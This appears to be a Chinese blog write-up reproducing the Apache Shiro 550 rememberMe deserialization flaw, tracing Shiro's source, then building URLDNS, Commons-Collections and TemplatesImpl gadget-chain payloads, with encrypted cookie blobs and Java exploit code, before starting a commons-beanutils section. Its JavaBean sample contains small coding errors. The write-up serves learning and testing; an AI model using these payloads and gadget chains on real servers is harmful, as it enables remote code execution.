    <content><![CDATA[<h1 id="DDElR">Shiro550</h1>
今天我们精进shiro的反序列化！！！

<p>之前有做过相关的shiro550与721的复现，不过都是利用工具的，没有理解里面的原理</p>
<p>550的话是由于他的密钥是固定的，是可以爆破的，经过Base64和AES解密以后，可以将里面的内容构造为恶意代码，从而达到RCE的目的</p>
<h2 id="BsFWJ">发现</h2>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735016085510-9edb1422-d5d2-49dc-8581-9dbd995c1e4e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735016085510-9edb1422-d5d2-49dc-8581-9dbd995c1e4e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在登录界面有remember me的选项，勾选后点击登录抓包</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735016156894-ad6d98f6-4148-4301-a05e-ee9553b17993.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735016156894-ad6d98f6-4148-4301-a05e-ee9553b17993.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>rememberMe字段中会有这么一大段东西，说明里面是存储着某些信息的，这些信息可以让我们下次不需要再次登录。我们这里可以去源码中看看进行了什么样的操作呢</p>
<p>在源码中找到了一个<code>CookieRememberMeManager</code>，应该就是它在管理这个Rememberme</p>
<p>在这个地方，将数据包中的cookie取出来进行base64解码，后返回解码的东西，我们看看谁调用了它</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735017435925-423b66ff-6436-4124-a8ce-89c401a24119.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735017435925-423b66ff-6436-4124-a8ce-89c401a24119.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>找到在<code>getRememberedPrincipals</code>中调用了这个方法，将解码出来的字节，放入<code>convertBytesToPrincipals</code>方法中，我们跟进看一下（看名字就知道跟认证有关）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> PrincipalCollection <span class="title function_">getRememberedPrincipals</span><span class="params">(SubjectContext subjectContext)</span> &#123;</span><br><span class="line">        <span class="type">PrincipalCollection</span> <span class="variable">principals</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes = getRememberedSerializedIdentity(subjectContext);</span><br><span class="line">            <span class="comment">//SHIRO-138 - only call convertBytesToPrincipals if bytes exist:</span></span><br><span class="line">            <span class="keyword">if</span> (bytes != <span class="literal">null</span> &amp;&amp; bytes.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                principals = convertBytesToPrincipals(bytes, subjectContext);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException re) &#123;</span><br><span class="line">            principals = onRememberedPrincipalFailure(re, subjectContext);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> principals;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个方法内，对所传入的字节进行一个<strong>解密</strong>，然后将<strong>反序列化</strong>后的它返回了回去</p>
<p>这里的解密函数就是AES解密，反序列化也是调用了原生的readObject</p>
<p>如果说它带了cc的依赖，我们就可以打它的cc依赖</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">convertBytesToPrincipals</span><span class="params">(<span class="type">byte</span>[] bytes, SubjectContext subjectContext)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">            bytes = decrypt(bytes);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> deserialize(bytes);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>大概流程如下，反序列化的点就在convertBytesToPrincipals中</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735018432588-cfe2debb-3ab5-4284-9f48-7b899ffcc280.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735018432588-cfe2debb-3ab5-4284-9f48-7b899ffcc280.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="SVcDS">攻击方式</h2>
<h3 id="nAXKz">URLDNS</h3>
由于shiro有cc依赖，但是在代码中没有import，所以cc的依赖没有办法打，我们先来验证一下，去打jdk自己的URLDNS链子

<p>先生成一个可用域名</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735019488981-1f10d404-cdc6-4cc4-9ccd-48234e27562a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735019488981-1f10d404-cdc6-4cc4-9ccd-48234e27562a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>再去生成一个URLDNS链子的payload</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735019972386-7f641648-f410-43c1-8cb8-22e6be86b96e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735019972386-7f641648-f410-43c1-8cb8-22e6be86b96e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>后续我们需要用脚本，对生成的payload进行AES加密，再进行base64加密（生成payload如下）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">GVpWKjIkTESUwYXtKFTtzBwv5gw1KjohG6Q1RBnlOtMF5aGvp6FnFFlyMyPhmvdWFyL8TLw8e34+65Sw3+c0jq0qop8ubQQtcAjHdZu2T6Nfleg7g7/sA0gOyaUCRpR5WYkqDo4/GxFwM2Qn22t0Dx6GogH20i0g19gGsHWT1Ng1LTa0TgvHKJvVT8L8wCWKh5RRncVyFLmVM6OUDuroPjw2NNIKspmj2RGD6yMCSBe3fon6nfFXnctFYO4oT7wxmL+3EKZ55HKdCRVXr4nlYnh+MU1KS9KUuuMrhdUFOCNHEcVEV7IXLBBXCwjM1yibRCgzXSGGojxNqvAO1wl4JeIRLLsVvzMbeokSS14xcmHPLQC25TmcdfgcFr91zWGDUg7zPR+8R/uCZf2hK/YoqFSKy6bqFYjuENfZ2YDbZTCZBk+tIF6YDcbkOU4eVnbaZRAmJMY2PR+fEPKzNcaZlkY720KjGE6G0YRCvLC+hUE=</span><br></pre></td></tr></table></figure>

<p>将paload放入数据包中的<strong>reMeberMe</strong>中，shiro就会对他进行反序列化操作从而触发URLDNS</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735024319706-e7e6fa38-06bc-489d-a916-a896ab265ea4.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735024319706-e7e6fa38-06bc-489d-a916-a896ab265ea4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735024405834-d70b431e-773e-4f89-9fc2-f6a1c7d952d3.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735024405834-d70b431e-773e-4f89-9fc2-f6a1c7d952d3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="SqMdJ">CC攻击链</h3>
<h4 id="E5WRm">环境配置</h4>
这里我们用cc3.2.1来搭建这个环境

<p>我们先来使用cc6来打一下这个shiro环境，看一下它是一个怎么样的效果</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">GjDw1BVbSzeG2ZRTiqsafqN5Woprm2vK0ocyatebZYZCU5Wu30PTYzojzumFhnlTQ5GTyzlGh+Pm3PL5pBzTdQNVgwBoa7PqqUh9oqU2IIJymF2XMaQPVq513mugvjFZ8ZC2UoHDaFvlDRUToAtLqcJpfUoRq52Gvx8v1fB9GyJm5iZSLfXMmXDznYPVltvFvdePbi0eXj2K/85Zq89TCfsfVU5h2vAwP4XiTkZAlJgaXbR3FuFDpDZbKHaMRMdN5dCVT0nqHuCX/kIayuy7AfiMJRIt+sW0EFSX8S8T6Xcs/mCPtqvsiI0Kuxxl5oJq1fDRAf/QX8ovcUPiH0JK76llM+xtfkq4CrzoaY+NFp6lYOTXKN9PU+sjcioO/3BODMqmjg0clQHQV4ici3uIJ2C18V9AiZIK8S/NBhbi+0pjDECD5iErgGF5EGvdl4D85+R8GwxX8qwykGokzno6hwfyPMe9+UdvTn1rjsIroPjhETlyOZNzFlqu8Zj1K52JydgbceL1F35RjKWJzGc7dEBzmJmQ6Cahd6ICdgLRImlBYr62LZM18CXqB9naxJ4lbekq4R1zCQ8KKhpqWaAYXaL2jBsVympOss2I/uB4DQGYBVYBNowkwFlG3/O3zlDz+G60BVUR4cQnNwWqAnEWTSgS7ZGWaCfQW4T3gg4Gv5ZuuvEek9Kwi+h4e6bcrHEq6A+WTlrgb0XS40yQF2bwleEeNggdwpTrGbjd3pLUCa00Tn/yWLzzuN/6TwpANBHDfEB3RrPdaQSNu7YOGPSe4xEH3l+sSJMuULdwr/Two0TDOU1E/X9Y0wJ0crm0d7MIkvnHfqk6SGtyUTVYfo2c81sSWuB/6AQL0L9eYVozGWkl6h9Ap4lYckTuI5L1i7klVSSqcl++P0W26RrDTcVUs0YHTQc0KoPcrjrJm6jvJjz8RqiaClyrGIBL3kuSmmOWPZWT9V9CPhpz0n08i402ZdcVJOAhYAPk3B6P1t4ViPl0gcUP/hUt/acHMnhZGqNSRO5lgTambJg4d+bH9HUky19NXu3jb4jM9vauu6lqcmG87x97/uOA4EJRcGf2iFZO+6k96gRhUY/AJ0O5aE8veJhwnyPzaCaJzAdQlp4kQrWG0dvhKLhLHwdjOkrvBmERfxN58fpQDl82VHrV76+8jTIDFUZxzr/a/7IIqpmimcK9gsv7dBKP8nMRLoY64C0FR92FhRTcGcrGYc+NZpGK08aXZK1/eWqi9RgV2LY+lFn8f1Gl6QsIzy7H6zSw9GLq9r2EMR/DthiuPLBlOciFL50RVMit0Ts+wtSRmb3/3U97OP2zDEWeBNno0zRmCgrl0Mja1LbI1wtmYCFqHKbp1aRhCxKlHe94rkv8kpNpJwp3arAJckGZxRdhdr3MqL0JwQm0BOlfqyiGV4Z/LbczMIcut+OXRjma4nT8jIdFEwfVGc3a9OxU2x37F++ewCRl4jBr7+7N2f6KmN0JOLe21wsCm4pl0AKO6ZldfOeyZrQeo6SQ/44jxbQ/cg79vmV5<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="CdJT7">报错分析</h4>
将payload放入rememberMe后，服务器端爆出了一下错误，说无法加载Transformer这个类

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735025531998-d4316e0b-f014-4196-a7e1-34b0ac180998.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735025531998-d4316e0b-f014-4196-a7e1-34b0ac180998.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这里我们跟着源码去分析一下</p>
<p>这里找到报错的地方，这里它并不是调用了默认的字节输入流，而是调用了shiro自己写的一个<code>ClassResolvingObjectInputStream</code>，我们跟进去<code>ClassResolvingObjectInputStream</code>看一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> SerializationException &#123;</span><br><span class="line">        <span class="keyword">if</span> (serialized == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;argument cannot be null.&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(msg);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">        <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(bais);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassResolvingObjectInputStream</span>(bis);</span><br><span class="line">            <span class="meta">@SuppressWarnings(&#123;&quot;unchecked&quot;&#125;)</span></span><br><span class="line">            <span class="type">T</span> <span class="variable">deserialized</span> <span class="operator">=</span> (T) ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line">            <span class="keyword">return</span> deserialized;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to deserialze argument byte array.&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SerializationException</span>(msg, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在<code>ClassResolvingObjectInputStream</code>只有两个方法，一个构造方法我们就不看了，看一下另一个</p>
<p>这里的resolveClass的方法，是在<strong>反序列化</strong>时都会调用到的，在默认的<code>ObjectInputStream</code>也是有这个方法的，我们来对比一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735026166933-ce1f08e0-ac19-4016-8925-807be77b3869.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735026166933-ce1f08e0-ac19-4016-8925-807be77b3869.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>大概的差别就是<code>ClassResolvingObjectInputStream</code>调用的是<code>ClassUtils.forName(osc.getName());</code>，其中<code>ClassUtils</code>是shiro自定的一个工具类</p>
<p>而<code>ObjectInputStream</code>调用的是<code>Class.forName(name, false, latestUserDefinedLoader());</code></p>
<p>我们可以这样理解，Class.forName是可以对数组进行操作的，而ClassUtils.forName是不能对数组进行操作的，这就是报错的原因</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ClassResolvingObjectInputStream</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass osc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ClassUtils.forName(osc.getName());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownClassException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;Unable to load ObjectStreamClass [&quot;</span> + osc + <span class="string">&quot;]: &quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ObjectInputStream</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)</span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> desc.getName();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> Class.forName(name, <span class="literal">false</span>, latestUserDefinedLoader());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">            Class&lt;?&gt; cl = primClasses.get(name);</span><br><span class="line">            <span class="keyword">if</span> (cl != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> cl;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> ex;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h4 id="JFsrD">报错调整</h4>
<font style="color:rgb(50, 50, 50);">这里我们不能利用数组了，因为cc1中调用Runtime.exec需要用</font>`<font style="color:rgb(50, 50, 50);">ChainedTransformer</font>`<font style="color:rgb(50, 50, 50);">和</font>`<font style="color:rgb(50, 50, 50);">ConstantTransformer</font>`<font style="color:rgb(50, 50, 50);">来更正返回值，所以我们选用动态类加载去加载恶意类，大概流程如下</font>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735027682629-1aafb1a0-90c1-4c90-919b-1c05b87b61d5.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735027682629-1aafb1a0-90c1-4c90-919b-1c05b87b61d5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>接下来我们去改写一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tl</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;CC3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map1,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, templates);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(entry, <span class="string">&quot;qwe&quot;</span>);</span><br><span class="line">        lazyMap.remove(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazyMap,invokerTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(map2);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>然后老样子生成payload，放入remeberMe中（这个payload有点长，因为我们把整个类的东西都放进去了）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">z63yaT+pRKuWY/div9sA3wupuFtc2pvoYNv5xIQkya7wsuDr6wrIPxFV/ZjwFZiWaoQCvPy7TDK5+d+X8xkNocr08tLLfq7HMSSRFArD6F6S0+FcLzTXQpr2RiKCbmfV2i6vihz3ylcIhyHEn6XaUF7cKY5XNxjrrUxh2f1gsCGTX3NjU155fYuqM+ndqlh7/5140q9Fn0MIpWgZesq/eNfUYEA3iEcDv5VM+W5p/DDzvERg9rftFrzI60jkUZvxHqgF+LjLieNqbYMcZl0ah54n3IytkCfayN31QEqKxzqO8iHE7JNmPvzSclIZSuohjTHFLk+Um3Gh9MqMcgBeDrJFgP+KXkwIFCKTV7rEJku51b6WzXeOHrPAU07WSmoWnMZxasyVbGZSxkIj7SGdRZam+CtUt+1VtMtJvRP0J47R4js3SmvLFg5jy2ANNIuBxlemOsubsVlTbQM0bWjWm+bcX9cknFmCEtCT+chlqd7wAgoZmNm3E5UUAQKE4kTS4HLEUYpBkQrFg3NDqBx4i4Md7eMZvmBw0J8qlTLUIL1BYtBlo+g3Un3WPsmkDB3MUpcP7CBbwziwBfnzSgiC0eztsKGVb0FOO7ohs0qR9U6IodiqcwMvwmm+4Ts/i10cDj40VjhiNTYqIpEr0eo44/HSeR2BZHjMwTRM5z3W1o6bC8qtrlNxHqtClXzKGOtbZVJ2aeUe/fzU5EBiFx4joqhlfksS8pO0nEilUUPYaLd1UQ+JmozbIXxWnGRLk8eps3z+j6Lr4J9+rAgLbplTMrPF+avWO5OjonB3FCczFdXCysDahd4G/2CR599CYcHuAbHVOFEAQ56z3MdcIryqecxwUXQDGZF+8LqZX0N0AEwIjOLK2Xrto2dmkz0kgwU2lNn/fb8fusO1K4jV+lfGkB7Xvbu3EUS0WlK1jGBo/ORgIuxnRdi7TI1fYbMhxq5uwVlnlYLY7mtQSCtyEKqexn1h88fR4yrHAKD9JzhUP0J5Zxnpqndv0zOkV5U8rXM3lv0dwh7/WuHAypsGD5243nQmxDOwhYJSio/tx6IV77HJgaSVqQRUPte+ijoZ6hMAujEVkHFRuT+Nc1F+E7tj3Jd0akQ227Xoww5o7V1IzVGf+GfkSB8uCDfXT37T+1IsE8LPsMV9smrNcQ8BGQUONjgvtkVR4c6wO8ROUEFaJWaSl6taG82ULGQpJwfjvI8f9Gwg+wdnXO6P6IQZZlf830u9wCMDvU+aSpV+uKHuxpsvELZ3mceTZJbTaR3eQr8C8HDgM95r6pvDopVUFDoTXEXfygWa3vg4ObNXRogYAAu/X9XRuomozqMyrj/alu3acxNyLxeU9gV1O+K9kGMu4wTckcvvAUNR66qGw07jUVGWcMB5NJh6tOHXs7Tnz4gT1gkGf/6evQC1zrZNC4J4VCEJSFQ74J84hFmrx/quevaTLEW4D/7f4oJup6yb66CK973iu7gwC4ykD3bD8ib2r8wwHkWJ391B8Onf2OLwKJDnrF/qPZlxPOhJJObRY/Nq0BlKtb2Vu5D4ebVADzIKBkpZE4yWaOcqiIEzk01DH7UQiz+m59UNnHdGkCZP8rjLv6obRK1BEImjcxvPhg7oBIM45x1u3mFAh6X2VOFADsJOjRsp3obet0KutCwQY7hSdTVoR+fjNBAtKsPXXXsQVQ/+yJNB7UbkrnaqBxg3MOB5iw4zuCWCK3hSWP5EEDH2z5W145N68x3Z00wzutYJySe+mAAzWx6nyo1zO20v/bcB5OG+MjWjjqSupywC3y6ynLfQKGGouU5aa7rl8tLXuINFFqe+Ad6PRaZukJqOub8lDa/ZHbyYIRCVghmgpXMId9<span class="comment">//JaeyahKC7iOYIv3sqn1GYINNpoNxUZnDIpfC3YmKVm2VHggdgo/OWlvllwbqShJ3Ips0Z6RIPgqvag0aQ/gY1GFAce/dBbKejqvDbmoC9b97qzSzPWtrrraqxJ7slSKLGtdsyLOeY4RAl0m3JpKj+H/MFEYxV9HDdaeLfieFoBDlLBD2PGQFrS5EJHdavN34ZMCs4svg6MpbF/poqU8o7xZpsb91/VJ7NPATbuZOTcoMzG1KcCi3e0wHlFVaRM41IjW2b/1GkC70lAogdFbv2BnTNAonYm+xCb8TaCpfqaG+zHTeIMj0hjgi9j/StWcqPeWZIJojTJNE7/JSP+79OAynOrWqRxZ2UtobVtw57Ot5LoGYKPnxc3N7GP5ZY49ZNs42S12gLmQqH/xF/Zp33mXJLyP1UNrSNIF1oA9k4YyRVjmdm9HMtz2sfKZgfciHrz0lqstrwwb0OxRhdMq3/eE4OqxnhM26cANItGtY1hnVfGueQdRwGjTH3jcdQMiHhK4IZPBCfyoAACJtFCtYDiVk8GsYzDHy/nxIX0veI7J8Np3Rt73kj4Ax8g9mSwQADb8T2XSH4MJith4BvIwUMMOyToz3HW8cwzs6ZYmOUW0Fl8GOfKPzvlEo0IvYXllerte7cd7hxrTLI3bXjwl8ju9J7+8Cl0TZAOGs95s+qYKXkYeNZ8P8Xd980xj/F2CxfFJ3TtI4H2wkr9qkBpOmJ5g8I98y2bc6WZxqZXzjNr55yKghsi7DMGP9SFNuT9y6o242OSHVZkdZ3FdVlM5onHxs3qREIpjVnjz6hlSiTGjoH0LM26OjbGGfXYLsNY9e6pw1kt84D8URed/fiNEBQE8qQCgyxjUELiFwtGMSlnZNlh5qEEoyVF5UEvkfCrX1qixhDq135ex1JYpCjyK56q+QiB4nB6g1d2829xJOx9fu+pcVptiewUd736qeOBANiqPVazMQhU68xRPoThfvLa4dHOrIxW2bpOpyVXyxojrPkX6Y1wCIlXqM+sH77+8LfLCcJgdhFjm9CCso9SrKnAZhTfMl1X2aXMlVtCBmcSXwmf53ur7kt1nQGZfHb6XCqwCBtxqwPLm3KwpKuV4oD3RjjQV9ffM7BWyEdrNwtgo9Eyo0vRyyUUcl5zjwS8AoP0LiTgnmX6Mdj+6cQHVx9ijuMIbAw9VF0d9hfFtc3qsdbglWx08edupmeEpUre5aHe+fyAoP1+LruBWawdQCt/6aClzaI6QDijIMothRpUwz4+HN7YYoCrbKl9niSwOT0pDf9woU5xWCMD3ZWO4ZG2CAR23L1YnS2VrlrNg=&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735028766210-b275f81d-d018-4321-b4c1-2b93e2234d4b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735028766210-b275f81d-d018-4321-b4c1-2b93e2234d4b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="Vmycx">CB链</h3>
shiro框架本身是不带cc的依赖的，上次打cc依赖是我们自己加的，这次我们把这个cc依赖删掉，去打他本身的CB依赖（commons-beanutils）

<h4 id="DEXts">javabean</h4>
javabean是一个遵循特定写法的Java类

<p>特点：</p>
<ol>
<li>这个Java类必须有一个无参构造方法</li>
<li>属性必须私有化</li>
<li>私有化的属性必须通过public类型的方法暴露给其他程序，并且命名也遵循一定的命名规范</li>
</ol>
<p>例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123; <span class="keyword">return</span> <span class="built_in">this</span>.name&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123; <span class="built_in">this</span>.name = name; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span>&#123; <span class="keyword">return</span> <span class="built_in">this</span>.name; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">()</span>&#123; <span class="built_in">this</span>.age = age; &#125;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>如果想获取Javabean的私有属性，我们只能通过以下这种方式获取，但是在CB中为了能够动态的获取Javabean的私有属性，所以构造了一个PropertyUtils.getProperty方法</p>
